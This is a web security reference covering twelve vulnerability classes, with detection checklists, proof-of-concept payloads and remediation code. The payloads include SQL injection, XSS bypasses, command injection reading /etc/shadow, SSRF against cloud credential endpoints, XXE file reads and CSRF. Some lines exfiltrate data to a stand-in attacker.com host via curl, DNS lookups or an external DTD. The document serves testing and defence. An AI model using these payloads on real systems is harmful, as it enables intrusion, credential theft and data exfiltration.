# Attack Patterns & Exploit Simulation Reference

## Table of Contents
1. [SQL Injection](#sqli)
2. [Cross-Site Scripting (XSS)](#xss)
3. [Command Injection](#cmdi)
4. [Server-Side Request Forgery (SSRF)](#ssrf)
5. [XML External Entity (XXE)](#xxe)
6. [Path Traversal / LFI / RFI](#path)
7. [Server-Side Template Injection (SSTI)](#ssti)
8. [Deserialization Attacks](#deser)
9. [Cross-Site Request Forgery (CSRF)](#csrf)
10. [HTTP Request Smuggling](#smuggling)
11. [Race Conditions](#race)
12. [Fuzzing Methodology](#fuzzing)

---

<a name="sqli"></a>
## 1. SQL Injection

### Detection Checklist
1. Identify all database query construction points
2. Check if user input is concatenated/interpolated into queries
3. Verify parameterized queries or ORM usage
4. Test with diagnostic payloads

### Proof-of-Concept Payloads

**Authentication Bypass**
```
' OR '1'='1' --
' OR '1'='1' /*
admin' --
' OR 1=1 LIMIT 1 --
' UNION SELECT 'admin','password_hash' --
```

**Error-Based Detection**
```
'
''
' AND '1'='2
' AND 1=CONVERT(int, @@version) --
' AND 1=1 --   (true — normal response)
' AND 1=2 --   (false — different response = injectable)
```

**Union-Based Extraction**
```
' UNION SELECT NULL --                     (find column count)
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT username, password FROM users --
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**Blind (Boolean)**
```
' AND SUBSTRING(username,1,1)='a' --
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --
```

**Blind (Time-Based)**
```
'; WAITFOR DELAY '0:0:5' --              (MSSQL)
' AND SLEEP(5) --                         (MySQL)
' AND pg_sleep(5) --                      (PostgreSQL)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

### Remediation Pattern
```python
# ALWAYS use parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s AND role = %s", (user_id, role))

# With ORMs, avoid raw queries; if necessary:
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])

# For dynamic column/table names (can't parameterize):
ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
if sort_column not in ALLOWED_COLUMNS:
    raise ValueError("Invalid sort column")
query = f"SELECT * FROM users ORDER BY {sort_column}"  # safe after allowlist check
```

---

<a name="xss"></a>
## 2. Cross-Site Scripting (XSS)

### Detection Checklist
1. Find all places where user input is rendered in HTML
2. Check if output encoding/escaping is applied
3. Identify template engine auto-escaping configuration
4. Check for dangerous sinks (innerHTML, document.write, eval, v-html)

### Proof-of-Concept Payloads

**Basic Reflected XSS**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
"><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
```

**Filter Bypass**
```html
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload=alert('XSS')>
<img src=x onerror=alert`XSS`>
javascript:alert('XSS')
<a href="javascript:alert('XSS')">click</a>
<iframe srcdoc="<script>alert('XSS')</script>">
```

**DOM-Based XSS Sinks**
```javascript
// Dangerous sinks to search for:
document.innerHTML = userInput;
document.write(userInput);
element.outerHTML = userInput;
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput);
window.location = userInput;
```

**Stored XSS via Different Contexts**
```html
<!-- In HTML attribute -->
" onmouseover="alert('XSS')
' onfocus='alert(1)' autofocus='

<!-- In JavaScript string -->
'; alert('XSS'); //
\'; alert(\'XSS\'); //

<!-- In CSS -->
expression(alert('XSS'))
url('javascript:alert(1)')

<!-- In JSON rendered in HTML -->
</script><script>alert('XSS')</script>
```

### Remediation Pattern
```javascript
// Use framework auto-escaping (React, Angular, Vue do this by default)
// NEVER use:
element.innerHTML = userInput;        // Use textContent instead
dangerouslySetInnerHTML={{ __html: x }} // Only with sanitized input

// If you must render HTML, sanitize with DOMPurify:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// Set Content-Security-Policy header:
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

<a name="cmdi"></a>
## 3. Command Injection

### Detection Checklist
1. Find all shell execution calls (system, exec, spawn, popen)
2. Check if user input flows into these calls
3. Verify input sanitization or use of safe alternatives

### Proof-of-Concept Payloads

**Basic Injection**
```
; ls -la
| cat /etc/passwd
`whoami`
$(whoami)
& ping -c 4 attacker.com
|| cat /etc/shadow
```

**Blind Detection**
```
; sleep 5                              (time-based)
| ping -c 5 127.0.0.1                 (time-based)
; curl http://attacker.com/$(whoami)   (out-of-band)
; nslookup $(whoami).attacker.com      (DNS exfiltration)
```

**Argument Injection**
```
--output=/tmp/evil
-o /tmp/evil
--config=/dev/null
```

### Remediation Pattern
```python
# NEVER use shell=True with user input
# WRONG:
subprocess.run(f"convert {filename} output.png", shell=True)

# RIGHT — use array form (no shell interpretation):
subprocess.run(["convert", filename, "output.png"])

# If shell features are needed, use shlex.quote():
import shlex
subprocess.run(f"convert {shlex.quote(filename)} output.png", shell=True)

# Best: avoid shell entirely — use library APIs instead of CLI tools
from PIL import Image
img = Image.open(filename)
img.save("output.png")
```

---

<a name="ssrf"></a>
## 4. Server-Side Request Forgery (SSRF)

### Detection Checklist
1. Find all server-side HTTP request functions
2. Check if the URL/host is user-controlled
3. Verify URL validation and allowlisting

### Proof-of-Concept Payloads

**Internal Network Access**
```
http://127.0.0.1:8080/admin
http://localhost:3000/internal
http://[::1]:8080/
http://0.0.0.0:8080/
http://0x7f000001:8080/          (hex encoding)
http://2130706433:8080/           (decimal encoding)
http://017700000001:8080/         (octal encoding)
```

**Cloud Metadata Services**
```
http://169.254.169.254/latest/meta-data/         (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/   (GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)
```

**Protocol Smuggling**
```
file:///etc/passwd
gopher://127.0.0.1:6379/_SET%20evil%20payload
dict://127.0.0.1:6379/SET:evil:payload
```

**DNS Rebinding**
```
# Use a domain that resolves to internal IP after first lookup
# attacker-controlled DNS returns 1.2.3.4 first, then 127.0.0.1
```

### Remediation Pattern
```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'http', 'https'}
BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # link-local / cloud metadata
]

def validate_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Invalid scheme")
    # Resolve hostname to IP and check against blocklist
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    for network in BLOCKED_NETWORKS:
        if ip in network:
            raise ValueError("Internal network access blocked")
    return url
```

---

<a name="xxe"></a>
## 5. XML External Entity (XXE)

### Detection Checklist
1. Find all XML parsing code
2. Check if external entity processing is disabled
3. Verify DTD processing is disabled

### Proof-of-Concept Payloads

**File Read**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**SSRF via XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**Blind XXE (Out-of-Band)**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Remediation Pattern
```python
# Python — defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)  # Safe — external entities disabled

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

# PHP
libxml_disable_entity_loader(true);
```

---

<a name="path"></a>
## 6. Path Traversal / LFI / RFI

### Detection Checklist
1. Find all file operations that use user input in the path
2. Check for path normalization/validation
3. Verify chroot/jail or allowlist enforcement

### Proof-of-Concept Payloads

**Basic Traversal**
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd    (double encoding)
/etc/passwd%00.jpg                  (null byte — older systems)
```

**Windows Paths**
```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

**Remote File Inclusion (PHP)**
```
http://attacker.com/shell.txt
php://filter/convert.base64-encode/resource=config.php
php://input   (with POST body containing PHP code)
data://text/plain,<?php phpinfo(); ?>
```

### Remediation Pattern
```python
import os

UPLOAD_DIR = "/var/app/uploads"

def safe_file_access(user_filename):
    # Resolve to absolute path
    requested = os.path.realpath(os.path.join(UPLOAD_DIR, user_filename))
    # Verify it's still within the allowed directory
    if not requested.startswith(os.path.realpath(UPLOAD_DIR)):
        raise ValueError("Path traversal detected")
    return requested
```

---

<a name="ssti"></a>
## 7. Server-Side Template Injection (SSTI)

### Detection Checklist
1. Find template rendering with user-controlled input
2. Check if input is in the template string vs template variables
3. Test with arithmetic probe payloads

### Proof-of-Concept Payloads

**Detection (arithmetic probes)**
```
{{7*7}}            → 49 = Jinja2, Twig, or similar
${7*7}             → 49 = Freemarker, Thymeleaf, Mako
<%= 7*7 %>         → 49 = ERB
#{7*7}             → 49 = Pug/Jade
```

**Jinja2 (Python) — RCE**
```
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.items() }}
{{ request.environ }}
```

**Twig (PHP) — RCE**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

### Remediation
```python
# NEVER put user input in the template string
# WRONG:
render_template_string(f"Hello {user_input}")

# RIGHT:
render_template_string("Hello {{ name }}", name=user_input)
```

---

<a name="deser"></a>
## 8. Deserialization Attacks

### Detection Checklist
1. Find all deserialization calls
2. Check if input comes from untrusted source
3. Verify type restrictions or signature validation

### Vulnerable Patterns by Language

**Python**
```python
pickle.loads(user_data)      # CRITICAL — arbitrary code execution
yaml.load(user_data)         # Without Loader= — code execution
marshal.loads(user_data)     # Code execution
```

**Java**
```java
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  # Arbitrary code execution via gadget chains
```

**PHP**
```php
unserialize($user_data);     # Object injection, possible RCE
```

**Node.js**
```javascript
node-serialize: require('node-serialize').unserialize(data)  # RCE
```

### Remediation
```python
# Use safe alternatives:
yaml.safe_load(data)         # Instead of yaml.load()
json.loads(data)             # Instead of pickle for data exchange

# If pickle is required, use hmac to verify integrity:
import hmac, pickle
signature = hmac.new(SECRET_KEY, data, 'sha256').hexdigest()
# Verify signature before unpickling
```

---

<a name="csrf"></a>
## 9. Cross-Site Request Forgery (CSRF)

### Detection Checklist
1. Find all state-changing endpoints (POST, PUT, DELETE)
2. Check for CSRF token validation
3. Verify SameSite cookie attribute

### Proof-of-Concept

```html
<!-- Auto-submitting form -->
<form action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Image tag for GET-based state changes -->
<img src="https://target.com/api/delete?id=123">
```

### Remediation
```python
# Use framework CSRF protection:
# Django: {% csrf_token %} in forms, CsrfViewMiddleware enabled
# Express: csurf middleware
# Spring: CsrfFilter (enabled by default with Spring Security)

# Set SameSite cookie attribute:
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

---

<a name="smuggling"></a>
## 10. HTTP Request Smuggling

### Detection Checklist
1. Identify if there's a reverse proxy / load balancer in front of the app
2. Check for inconsistent `Content-Length` / `Transfer-Encoding` handling
3. Look for HTTP/1.1 keep-alive connections through proxies

### What to Look For
- Discrepancies between how frontend and backend parse HTTP requests
- `Transfer-Encoding: chunked` handling differences
- Connection reuse between proxy and backend

---

<a name="race"></a>
## 11. Race Conditions

### Detection Checklist
1. Find operations that read-modify-write shared state
2. Check for transaction isolation in database operations
3. Identify time-of-check-to-time-of-use (TOCTOU) patterns

### Common Targets
```
# Financial operations
Grep: pattern="(balance|credit|debit|transfer|withdraw|deposit)"

# Inventory/stock management
Grep: pattern="(stock|inventory|quantity|available|remaining)"

# Coupon/discount redemption
Grep: pattern="(redeem|coupon|discount|promo|voucher)"

# File operations (TOCTOU)
Grep: pattern="(os\.path\.exists|os\.access).*\n.*(open|read|write|unlink)"
```

### Remediation
```python
# Use database transactions with proper isolation:
with transaction.atomic():
    account = Account.objects.select_for_update().get(id=account_id)
    if account.balance >= amount:
        account.balance -= amount
        account.save()

# Use distributed locks for cross-service operations
# Use idempotency keys for API endpoints
```

---

<a name="fuzzing"></a>
## 12. Fuzzing Methodology

### Input Fuzzing Strategy

**Boundary Values**
```
""                    (empty string)
" "                   (whitespace only)
"a" * 10000           (max length)
-1, 0, 1              (boundary integers)
2147483647             (MAX_INT 32-bit)
9999999999999999       (overflow)
0.1 + 0.2             (floating point)
NaN, Infinity, -Infinity
null, undefined, None
```

**Type Confusion**
```json
{"id": "1"}           (string instead of int)
{"id": [1]}           (array instead of scalar)
{"id": {"$gt": ""}}   (NoSQL operator injection)
{"id": true}          (boolean instead of int)
{"id": null}
```

**Special Characters**
```
\x00                  (null byte)
\r\n                  (CRLF injection)
\n                    (newline — log injection, header injection)
%00                   (URL-encoded null)
🎉                    (emoji — Unicode handling)
\uFEFF               (BOM)
\u202E               (RTL override — visual spoofing)
```

**Protocol-Level Fuzzing**
```
# Oversized headers
curl -H "X-Custom: $(python -c 'print("A"*100000)')" http://target/

# Duplicate parameters
?id=1&id=2            (HTTP parameter pollution)

# Method override
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
```

### API Endpoint Fuzzing Order
1. Authentication endpoints (login, register, reset password)
2. Authorization boundaries (accessing other users' resources)
3. File upload endpoints (type, size, name, content)
4. Search/filter endpoints (injection via query parameters)
5. Webhook/callback URLs (SSRF)
6. Export/download endpoints (path traversal)
7. Rate-limited endpoints (bypass testing)
